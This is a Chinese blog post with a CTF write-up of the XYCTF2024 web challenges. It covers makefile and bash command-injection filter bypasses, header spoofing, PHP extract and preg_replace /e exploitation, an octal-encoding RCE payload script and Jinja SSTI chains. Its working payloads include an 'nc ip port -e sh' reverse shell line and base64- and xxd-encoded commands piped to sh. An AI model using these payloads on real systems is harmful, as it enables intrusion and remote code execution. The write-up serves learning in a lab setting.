<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XYCTF2024wp | HvAng's Nests</title><meta name="author" content="HvAng"><meta name="copyright" content="HvAng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="复现网址：gz.原神师范大学.cn Web全解，好像是Java反序列化全场唯一解？ https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39947980&#x2F;article&#x2F;details&#x2F;138249895 Crypto方向大佬 https:&#x2F;&#x2F;dexterjie.github.io&#x2F;2024&#x2F;04&#x2F;26&#x2F;赛题复现&#x2F;2024XYCTF&#x2F;#Crypto  Web  Web ezmake 题目提示flag">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF2024wp">
<meta property="og:url" content="https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html">
<meta property="og:site_name" content="HvAng&#39;s Nests">
<meta property="og:description" content="复现网址：gz.原神师范大学.cn Web全解，好像是Java反序列化全场唯一解？ https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39947980&#x2F;article&#x2F;details&#x2F;138249895 Crypto方向大佬 https:&#x2F;&#x2F;dexterjie.github.io&#x2F;2024&#x2F;04&#x2F;26&#x2F;赛题复现&#x2F;2024XYCTF&#x2F;#Crypto  Web  Web ezmake 题目提示flag">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hvang10.github.io/img/favicon.png">
<meta property="article:published_time" content="2024-04-27T08:58:32.000Z">
<meta property="article:modified_time" content="2024-05-17T13:46:12.597Z">
<meta property="article:author" content="HvAng">
<meta property="article:tag" content="Web-learn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hvang10.github.io/img/favicon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XYCTF2024wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-17 21:46:12'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="HvAng's Nests" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx.zhimg.com/80/v2-58d0f84fe61e154aa6095a9cbe2b1b7a_1440w.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="HvAng's Nests"><span class="site-name">HvAng's Nests</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XYCTF2024wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-04-27T08:58:32.000Z" title="Created 2024-04-27 16:58:32">2024-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-05-17T13:46:12.597Z" title="Updated 2024-05-17 21:46:12">2024-05-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">10.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>54mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XYCTF2024wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>复现网址：<a target="_blank" rel="noopener" href="https://gz.imxbt.cn/">gz.原神师范大学.cn</a></p>
<p>Web全解，好像是Java反序列化全场唯一解？<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39947980/article/details/138249895">https://blog.csdn.net/qq_39947980/article/details/138249895</a></p>
<p>Crypto方向大佬<br />
<a target="_blank" rel="noopener" href="https://dexterjie.github.io/2024/04/26/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024XYCTF/#Crypto">https://dexterjie.github.io/2024/04/26/赛题复现/2024XYCTF/#Crypto</a></p>
<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1>
<h2 id="web-ezmake"><a class="markdownIt-Anchor" href="#web-ezmake"></a> Web ezmake</h2>
<p>题目提示flag在当前目录下，直接读一下flag试试？<br />
<code>url/flag</code><br />
算是非预期了<br />
去了解一下makefile究竟是怎么读取文件的<br />
<a target="_blank" rel="noopener" href="https://www.yisu.com/ask/27496422.html">https://www.yisu.com/ask/27496422.html</a><br />
<code>content := $(shell cat flag)</code></p>
<h2 id="web-ezhttp"><a class="markdownIt-Anchor" href="#web-ezhttp"></a> Web ezhttp</h2>
<p>robots.txt，得到账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: yuanshen.com</span><br><span class="line">User Agent: XYCTF</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">Via: ymzx.qq.com</span><br><span class="line">Cookie: XYCTF</span><br></pre></td></tr></table></figure>
<p>记一个常用的请求头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Client-ip:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">X-Remote-IP:127.0.0.1</span><br><span class="line">X-Rriginating-IP:127.0.0.1</span><br><span class="line">X-Remote-addr:127.0.0.1</span><br><span class="line">HTTP_CLIENT_IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">X-Originating-IP:127.0.0.1</span><br><span class="line">via:127.0.0.1</span><br></pre></td></tr></table></figure>
<h2 id="web-ezmake-2"><a class="markdownIt-Anchor" href="#web-ezmake-2"></a> Web ez?Make</h2>
<p>过滤了f l a g @ $ * ? / 等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort `pwd | cut -c 1`[!q][k-m][!q][e-h]</span><br></pre></td></tr></table></figure>
<p>`pwd | cut -c 1`构造<code>/</code><br />
后面构造flag<br />
sort 可针对文本文件的内容，以行为单位来排序<br />
来自队友的解释，新姿势！new！</p>
<p>同时，我们还发现nc没有被过滤，但是<code>/</code>被过滤了，也可以试试反弹shell看看</p>
<p>赛后发现的好东西，反引号命令执行反弹shell，<strong>`nc ip port -e sh`</strong></p>
<p>还可以，先利用xxd转换和管道符传递最后用反引号来执行<br />
<strong>`echo 636174202F666c6167 | xxd -r -p`</strong></p>
<p>其实，这个我下面笔记有，但当时看见bash有a然后就放弃了，其实可以不要bash的，emmm</p>
<p>类似这种过滤的别的题目，这里做个笔记</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!!!!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">需要绕过字母，给一组绕过字母的payload:</span><br><span class="line"><span class="number">1</span>、<span class="keyword">echo</span> Y2F0IC9mbGFn| base64 -d | sh <span class="comment">#cat /flag</span></span><br><span class="line"><span class="number">2</span>、<span class="keyword">echo</span> <span class="number">636174202</span>f666c6167 | xxd -r -p | bash <span class="comment">#cat /flag 16进制</span></span><br><span class="line"><span class="number">3</span>、通配符 more /[b-z][b-z][@-z][b-z]</span><br><span class="line"><span class="number">4</span>、a=g.php; cat fla<span class="variable">$a</span></span><br></pre></td></tr></table></figure>
<p>然后在这个姿势下面再记录一个别的知识点，怕以后想找找不到了(打比赛时翻去年大佬wp一起找到的)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">利用 <span class="title function_ invoke__">create_function</span>() 函数创建匿名函数来代码注入</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nss</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shell</span>)&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$nss</span>))&#123;</span><br><span class="line">        <span class="variable">$nss_shell</span> = <span class="title function_ invoke__">create_function</span>(<span class="variable">$shell</span>,<span class="variable">$nss</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># shell=&amp;nss=;&#125;system(&#x27;cat /flag&#x27;);/*</span></span><br></pre></td></tr></table></figure>
<h2 id="web-ezmd5"><a class="markdownIt-Anchor" href="#web-ezmd5"></a> Web ezmd5</h2>
<p>找两张MD5值相等的jpg格式的图片<br />
直接搜，指路<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p>
<p>其实应该是通过fastcoll工具生成的</p>
<p>fastcoll工具生成<br />
<code>fastcoll_v1.0.0.5.exe -p 1.jpg -o 11.jpg 12.jpg</code><br />
<code>1.jpg</code>需要自己提供</p>
<h2 id="web-warm-up"><a class="markdownIt-Anchor" href="#web-warm-up"></a> Web warm up</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单，MD5若比较没什么好说的了，注意到<code>extract($_GET)</code>，变量覆盖，重新给XYCTF赋值即可<br />
<code>?val1=QNKCDZO&amp;val2=240610708&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</code><br />
得到<code>LLeeevvveeelll222.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，intval中传入数组时，会判断数组中的是否存在元素，有则返回1，否则返回0，preg_match当检测的变量是数组的时候会报错并返回0，使用数组绕过<br />
其次，注意到<code>preg_replace</code>存在<code>/e</code>漏洞，指路<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13625741.html">https://www.cnblogs.com/linfangnan/p/13625741.html</a><br />
payload:<code>?a=/abc/e&amp;b=system('cat /flag')&amp;c=abc</code>，再post: <code>a[]=1</code>即可</p>
<h2 id="web-ezrce"><a class="markdownIt-Anchor" href="#web-ezrce"></a> Web ezRCE</h2>
<p>bash八进制读取，通过两次here-strings的方法来解析复杂的带参数命令<br />
具体可参考安洵杯2020<br />
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0Yojqaxf2rDAhx2iD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8581#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0Yojqaxf2rDAhx2iD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8581#toc-3</a><br />
改一下官方脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):  <span class="comment"># 命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]</span><br><span class="line">        s += <span class="string">&#x27;\\&#x27;</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):  <span class="comment"># 八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload += n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"><span class="built_in">print</span>(build(payload))</span><br></pre></td></tr></table></figure>
<p>有兴趣也可以看<strong>CTFShow极限rce</strong>，原理类似</p>
<p>赛后发现，其实一次<strong>Here String</strong>也可以<br />
<strong>Here String</strong>用于将字符串作为命令的标准输入提供给命令。它的语法形式是 &lt;&lt;&lt;，后跟一个字符串，比如：<code>command &lt;&lt;&lt; &quot;string&quot; </code><br />
<strong>Here String</strong>的作用类似于使用管道将字符串传递给命令，但它更简洁，因为不需要使用 echo 或其他命令来产生输入。<br />
意思就可以直接产生传入并传给指定的command中从而使得bash可以执行有参数传入的函数<br />
利用$0表示当前的脚本——bash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$0</span>&lt;&lt;&lt;$<span class="string">&#x27;\143\141\164\40\57\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>(cat /flag)</strong><br />
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH4Quxiuq7q29hyGD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-2">https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH4Quxiuq7q29hyGD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-2</a></p>
<h2 id="web-我是一个复读机"><a class="markdownIt-Anchor" href="#web-我是一个复读机"></a> Web 我是一个复读机</h2>
<p>爆破账号密码<br />
<code>admin,asdqwe</code><br />
无意输入中文发现解析成<code>&#123;&#125;</code>，开始尝试SSTI模板注入</p>
<p>复现时看到有个师傅写的wp，通过构造错误数据登录包也可以发现是<code>SSTI</code><br />
<img src="https://pica.zhimg.com/80/v2-e6ea5ae47f18ca436ee76ab465e75156_1440w.png" alt="" /></p>
<p>发现过滤了，<code>_&#123;&#125;[]'</code>，以及一些关键的函数，包括有<code>func</code>等<br />
尝试绕过，借鉴一下<br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#常规绕过姿势</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()(<span class="number">128</span>).__init__.__globals__(<span class="string">&#x27;__builtins__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&#x27;</span>os<span class="string">&#x27;).popen(&#x27;</span>cat /flag<span class="string">&#x27;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">我()|attr(request.args.v1)|attr(request.args.v2)|attr(request.args.v3)()(<span class="number">128</span>)|attr(request.args.v4)|attr(request.args.v5)(request.args.v6)(request.args.v7)(request.args.v8)我&amp;v1=__class__&amp;v2=__base__&amp;v3=__subclasses__&amp;v4=__init__&amp;v5=__globals__&amp;v6=__builtins__&amp;v7=<span class="built_in">eval</span>&amp;v8=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">第一个居然不行，好像位置不太对？构造第二个</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">80</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&#x27;</span>os<span class="string">&#x27;).popen(&#x27;</span>cat /flag<span class="string">&#x27;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">我()|attr(request.args.v1)|attr(request.args.v2)|attr(request.args.v3)()|attr(request.args.v4)(<span class="number">80</span>)|attr(request.args.v5)|attr(request.args.v6)|attr(request.args.v4)(request.args.v7)|attr(request.args.v4)(request.args.v8)(request.args.v9)我&amp;v1=__class__&amp;v2=__base__&amp;v3=__subclasses__&amp;v4=__getitem__&amp;v5=__init__&amp;v6=__globals__&amp;v7=__builtins__&amp;v8=<span class="built_in">eval</span>&amp;v9=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h2 id="web-εzмkε"><a class="markdownIt-Anchor" href="#web-εzмkε"></a> Web εZ?¿м@Kε¿?</h2>
<p>手动测试，发现长度限制在7以内，未被过滤的只剩符号<code>&gt;&lt;@$()-</code>，肯定是围绕<code>$</code>做文章的<br />
<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/601876715">https://zhuanlan.zhihu.com/p/601876715</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lelin/p/11152780.html">https://www.cnblogs.com/lelin/p/11152780.html</a></p>
<p><code>$&lt;</code>，自动化变量，第一个依赖文件的名称，试一下，发现<br />
<img src="https://pic1.zhimg.com/80/v2-90fb13bc8f19c0cad44ffedfc7307f25_1440w.png" alt="" /><br />
<code>$&lt;</code>就是<code>/flag</code>，那么<code>$&lt;</code>它就属于一个变量吧</p>
<p>美元符号<code>$</code>，主要扩展打开makefile中定义的<strong>变量</strong><br />
<code>$$</code>代表真实的<code>$</code>，<code>$$</code>符号主要扩展打开makefile中定义的<strong>shell变量</strong></p>
<p><code>$($&lt;)</code>，<code>$(/flag)</code>试了一下，不行，那<code>/flag</code>应该是属于<strong>shell变量</strong>才对<br />
<code>$$($&lt;)</code>，试一下makefile中定义的<strong>shell变量</strong>？<br />
<img src="https://picx.zhimg.com/80/v2-a327a9a7399b4ddfd47847ecebcfdf30_1440w.png" alt="" /></p>
<p>也不行，再去了解一下<code>&lt;</code>和<code>&gt;</code>的功能</p>
<ul>
<li><code>&lt;</code>符号用于重定向输入，即将命令的输入从一个文件中读取,而不是从标准输入（键盘）</li>
<li><code>&gt;</code>符号用于重定向输出，即将命令的输出写入一个文件，而不是在屏幕上显示</li>
</ul>
